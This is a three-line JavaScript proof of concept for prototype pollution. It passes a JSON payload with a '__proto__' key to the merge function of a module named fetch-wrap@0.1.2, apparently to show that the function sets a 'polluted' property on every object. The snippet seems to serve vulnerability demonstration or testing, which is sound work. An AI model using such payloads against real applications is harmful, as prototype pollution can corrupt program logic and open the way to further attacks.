const fetchWrap = require('./fetch-wrap@0.1.2')
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}')
fetchWrap.merge({}, payload)
